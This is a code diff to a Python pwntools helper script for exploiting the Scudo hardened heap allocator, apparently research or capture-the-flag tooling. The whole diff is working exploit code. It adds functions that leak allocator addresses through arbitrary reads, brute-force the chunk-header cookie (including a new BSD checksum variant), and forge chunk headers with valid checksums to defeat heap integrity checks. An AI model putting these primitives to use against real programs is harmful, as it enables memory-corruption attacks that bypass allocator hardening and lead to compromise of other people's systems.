@@ -1,5 +1,5 @@
 from pwn import *
-from scudocookie import bruteforce, calc_checksum
+from scudocookie import bruteforce, calc_checksum, bruteforce_bsd, calc_checksum_bsd
 
 
 def malloc(io, size, data=b""):
@@ -42,11 +42,18 @@ def read(io, address, size):
     return res
 
 def get_libscudo_base(io, SCUDO_LIB ):
-    scudo_base = io.libs()[os.path.realpath(SCUDO_LIB)]
+    if os.path.realpath(SCUDO_LIB) in io.libs():
+        scudo_base = io.libs()[os.path.realpath(SCUDO_LIB)]
+    elif len(io.libs()) == 1:
+        scudo_base = list(io.libs().values())[0]
+    else:
+        scudo_base = int(input("Input lib base address: "), 16)
     return scudo_base
 
 def get_perclass_base(io, scudo_lib, class_id=0):
-    perclass_base = read(io, get_libscudo_base(io, scudo_lib) + 0x36000 + 0x48, 0x10)[0] - 0x2d00 
+    scudo_base = get_libscudo_base(io, scudo_lib)
+    stats_offset = int(input("Input Allocator offset from base (0x36000 for standalone, 0x56780 for llvm libc malloc-menu): "), 16)
+    perclass_base = read(io, scudo_base + stats_offset + 0x48, 0x10)[0] - 0x2d00 
     print(f'perclass base leak: {hex(perclass_base)}')
     return perclass_base + (class_id * 0x100)
 
@@ -58,18 +65,24 @@ def get_cookie_cheat(io, scudo_base):
     cookie = read(io, scudo_base+0x36000, 0x10)[0] # offset for libscudo-linux.so (md5sum: 6a1cb7efd0595861c21ca3cbd35e1657)
     return cookie 
 
-def forge_header(address, cookie, new_header) -> bytes:
-    new_checksum = calc_checksum(address, cookie, new_header)
+def forge_header(address, cookie, new_header, hardware=True) -> bytes:
+    if hardware:
+        new_checksum = calc_checksum(address, cookie, new_header)
+    else:
+        new_checksum = calc_checksum_bsd(address, cookie, new_header)
     forged_header = new_header + (new_checksum << 0x30)
     return forged_header.to_bytes(8, 'little')
 
-def bruteforce_cookie(io, addr):
+def bruteforce_cookie(io, addr, hardware=True):
     header = read(io, addr-0x10, 0x10)[0]
 
     checksum = header >> 0x30
     header = header & ((1 << 0x30)-1)
-    cookie = bruteforce(addr, checksum, header)
-
+    if hardware:
+        cookie = bruteforce(addr, checksum, header)
+    else:
+        cookie = bruteforce_bsd(addr, checksum, header)
+        
     return cookie
     
 def getLeak(io):
